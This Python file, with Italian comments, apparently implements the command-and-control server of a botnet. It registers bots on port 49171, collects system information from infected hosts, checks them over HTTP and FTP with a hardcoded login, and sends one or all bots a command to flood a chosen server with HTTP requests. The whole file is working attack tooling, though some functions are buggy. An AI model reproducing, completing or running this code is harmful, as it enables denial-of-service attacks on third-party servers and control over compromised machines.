import concurrent.futures
import socket
import json
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from ftplib import FTP
from time import sleep

import requests


class CC:
    # lista dei bot attivi con le relative porte
    activeBotSM = True
    activeBot = {}

    # costruttore
    def __init__(self):
        self.loadData()

    # aggiunge un bot alle liste
    def addBot(self, ip, data):
        while (not self.activeBotSM):
            continue
        self.activeBotSM = False
        self.activeBot[ip] = json.loads(data)
        self.activeBotSM = True
        return True

    # imposta lo stato di attività del bot
    def listen(self, event):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', 49171))
            s.settimeout(2)
            print("Server is listening...")
            while True and (not event.is_set()):
                try:
                    s.listen()
                    res = True
                    conn, addr = s.accept()
                    data = conn.recv(1024).decode()
                    data = data.split(" ")
                    res = self.addBot(data[0], data[1])
                    if res:
                        data = "bot registrated succesfully"
                        conn.send(data.encode())
                    else:
                        data = "bot not registrated"
                        conn.send(data.encode())
                    conn.close()
                except Exception as e:
                    continue
        except Exception as e:
            print("\nListening errors:", e)
            return
        finally:
            conn.close()
            s.close()

    def checkBot(self):
        print("Controllo bot attivi...")
        rm = []
        for k, v in self.activeBot.items():
            try:
                url = "http://" + k + ":" + str(v['http']) + "/status"
                response = requests.get(url)
                res = response.json()
            except Exception as e:
                print(k, " is not reachable over http port: ", e)
            try:
                url = k,":",str(v['ftp'])
                ftp = FTP(url, "CC", "Sicurezza")
                print(ftp.getwelcome())
            except Exception as e:
                print(k, " is not reachable over ftp port: ", e)

        print("Controllo terminato")

    def makeHTTPRequest(self, server, time=1, target=""):
        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/doGet"
                    response = requests.post(url, json={"url": server, "time":time})
                    res = response.json()
                    self.activeBot[k]["target"] = res["target"]
                    self.activeBot[k]["action"] = res["action"]
                except Exception as e:
                    print(e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
                response = requests.post(url, json={"url": server, "time": time})
                res = response.json()
                self.activeBot[target]["target"] = res["target"]
                self.activeBot[target]["action"] = res["action"]
            except Exception as e:
                print(e)
        print("Richiesta inviata")

    def getSystemInfo(self, target=""):
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/getSystemInfo"
                    response = requests.get(url)
                    res = response.json()
                    print("\t-----System info about", k, "-----")
                    for j,z in res.items():
                        if len(j) <= 6:
                            print("\t" + j + ":\t\t\t", z)
                        else:
                            print("\t" + j + ":\t\t", z)
                except Exception as e:
                    print(e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/getSystemInfo"
                response = requests.get(url)
                res = response.json()
                print("\t-----System info about", target, "-----")
                for j, z in res.items():
                    if len(j) <= 6:
                        print("\t" + j + ":\t\t\t", z)
                    else:
                        print("\t" + j + ":\t\t", z)
            except Exception as e:
                print(e)


    def command(self, event):
        sleep(1)
        while (True):
            comando = input("C&C@command: ")
            #Ferma il server
            if comando == "stop":
                event.set()
                return
            #Mostra la lista di tutti i bot attivi
            elif comando == "ls":
                print("Ip\t\thttp\t\tftp")
                for k, v in self.activeBot.items():
                    print(f"{k}\t{v['http']}\t\t{v['ftp']}")
            #Mostra la lista di tutti i bot attivi ed il relativo stato
            elif comando == "ls -s":
                print("Ip\t\thttp\t\tftp\t\ttarget\t\t\t\taction")
                for k, v in self.activeBot.items():
                    print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['target']}\t\t{v['action']}")
            #Comando per eseguire un'attacco http ad un determinato server
            elif comando.startswith("get"):
                c = comando.split(" ")
                if len(c) == 1 or len(c) == 2:
                    print("Command not found")
                if c[3] == "all":
                    self.makeHTTPRequest(c[1], time=c[2])
                elif c[3] in self.activeBot:
                    self.makeHTTPRequest(c[1], time=c[2], target=c[3])
                else:
                    print("Command not found. Correct command [get server time all | get server time target(ip)]")
            #Comando per acquisire informazioni sul sistema che ospita il bot
            elif comando.startswith("info"):
                c = comando.split(" ")
                if len(c) == 1 :
                    print("Command not found. Correct command [info ip | info all]")
                elif c[1] == "all":
                    self.getSystemInfo()
                else:
                    if c[1] in self.activeBot:
                        self.getSystemInfo(target=c[1])
                    else:
                        print("Command not found. Correct command [info ip | info all]")
            #Comando per verificare la raggiungibilità dei bot
            elif comando.startswith("ck"):
                c = comando.split(" ")
                if len(c) == 1:
                    print("Command not found")
                if c[1] == "all":
                    self.checkBot()
                elif c[1] in self.activeBot:
                    self.checkBot(target=c[1])
                else:
                    print("Command not found. Correct command [ck all | ck target(ip)]")
            else:
                print("Command not found")
                continue
    # load activeBot from file
    def loadData(self):
        with open("./activeBot.json", 'r') as f:
            self.activeBot = json.load(f)

    # write activeBot on file
    def writeData(self):
        with open("./activeBot.json", 'w') as f:
            json.dump(self.activeBot, f, indent=2)


# avvia il C&C
def startCC():
    print("Starting C&C...")
    cc = CC()
    event = Event()
    task = []
    with ThreadPoolExecutor(max_workers=2) as exec:
        task.append(exec.submit(cc.listen, event))
        task.append(exec.submit(cc.command, event))
        done, not_done = concurrent.futures.wait(task, return_when=concurrent.futures.FIRST_COMPLETED)
        exec.shutdown(wait=False)
    cc.writeData()
    print("C&C stopped")
    return


if __name__ == "__main__":
    startCC()
